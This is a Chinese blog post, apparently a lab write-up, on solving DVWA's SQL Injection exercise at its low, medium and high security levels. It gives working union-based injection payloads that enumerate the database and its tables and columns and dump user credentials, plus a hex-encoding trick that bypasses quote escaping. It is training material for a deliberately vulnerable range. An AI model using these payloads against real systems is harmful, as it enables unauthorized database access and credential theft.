---
title:      "SQL Injection ---dvwa"
description: "主要用来记录dvwa靶场 中SQL Injection 的破解方式"
author:     "伍帆"
image: "/img/home-bg.jpg"
date: 2022-06-28
published: true
tags:
    - 靶场
    - dvwa
URL: "/2022/6/sql injection/"
categories: [ "网安" ]
---


## SQL Injection 简介

SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。

## 手工注入思路
自动化的注入神器sqlmap固然好用，但还是要掌握一些手工注入的思路，下面简要介绍手工注入（非盲注）的步骤。
> 1.判断是否存在注入，注入是字符型还是数字型
> 
> 2.猜解SQL查询语句中的字段数
> 
> 3.确定显示的字段顺序
> 
> 4.获取当前数据库
> 
> 5.获取数据库中的表
> 
> 6.获取表中的字段名
> 
> 7.下载数据

## LOW 级别破解
>查看源代码
![low级别代码](/img/SqlInjection/low_code.png)
可以看到，Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。

    现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法看到源码的基础上。
#### 1.判断是否存在注入，注入是字符型还是数字型
输入1，查询成功：
![low级别代码](/img/SqlInjection/low1.png)
输入1’or ‘1’=’1，查询成功：
![low级别代码](/img/SqlInjection/3.png)
返回了多个结果，说明存在字符型注入。

#### 2.猜解SQL查询语句中的字段数
通过输入 `1' union select 1,2 ...#` 判断字段数

输入 `1' union select 1,2#` 显示如下
![low级别代码](/img/SqlInjection/2-1.png)
输入 `1' union select 1,2,3#` 显示如下
![low级别代码](/img/SqlInjection/2-2.png)
说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。

#### 3.确定显示的字段顺序
输入`1′ union select 1,2 #`，查询成功：
![low级别代码](/img/SqlInjection/2-1.png)
说明执行的SQL语句为`select First name,Surname from 表 where ID=’id’…`

#### 4.获得当前数据库
输入`1' and 1=2 union select database(),user()#`，查询成功：
![low级别代码](/img/SqlInjection/2-3.png)
说明当前的数据库为root 用户为root用户

#### 5.获取数据库中的表
输入`1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #` 判断表

#### 6.获取表中的字段名
输入 `1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #` 查询表中字段

#### 7.下载数据
输入 `1' and 1=2 union select first_name,password from users --` 获得users 数据库中的用户名和密码
![low级别代码](/img/SqlInjection/2-4.png)


## medium 级别破解
>查看源代码
![low级别代码](/img/SqlInjection/medium.png)
可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号
\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。   
![low级别代码](/img/SqlInjection/medium1.png)
    
    虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数

#### 1.判断是否存在注入，注入是字符型还是数字型
打开 burpSuite 对数据进行抓包
![low级别代码](/img/SqlInjection/3-1.png)
抓包更改参数id为`1′ or 1=1 #` 发现报错
![low级别代码](/img/SqlInjection/3-2.png)   
抓包更改参数id为`1 or 1=1 #`，查询成功：
![low级别代码](/img/SqlInjection/3-3.png)
说明存在数字型注入。 
   
     由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。）

#### 2.猜解SQL查询语句中的字段数
抓包更改参数id为`1 order by 2 #`，查询成功：
![low级别代码](/img/SqlInjection/3-4.png)
抓包更改参数id为`1 order by 3 #`，报错：
![low级别代码](/img/SqlInjection/3-5.png)
说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。
#### 3.确定显示的字段顺序
抓包更改参数id为`1 union select 1,2 #`，查询成功：
![low级别代码](/img/SqlInjection/3-6.png)
说明执行的SQL语句为select First name,Surname from 表 where ID=id…

#### 4.获取当前数据库
抓包更改参数id为` and 1=2 union select database(),user()# `，查询成功：
![low级别代码](/img/SqlInjection/3-7.png)

#### 5.获取数据库中的表
抓包更改参数id为` union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`

#### 6.获取表中的字段名

抓包更改参数id为`1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#`，查询失败：
![low级别代码](/img/SqlInjection/3-8.png)
这是因为单引号被转义了，变成了\’。

可以利用16进制进行绕过，抓包更改参数id为`1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #`，查询成功

#### 7.下载数据

抓包修改参数id为`1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`，查询成功：

![low级别代码](/img/SqlInjection/3-9.png)


## High级别
>查看源代码
> ![low级别代码](/img/SqlInjection/high.png)
> 可以看到，与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。

虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。

输入`'1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`，查询成功
![low级别代码](/img/SqlInjection/4-1.png)

    需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。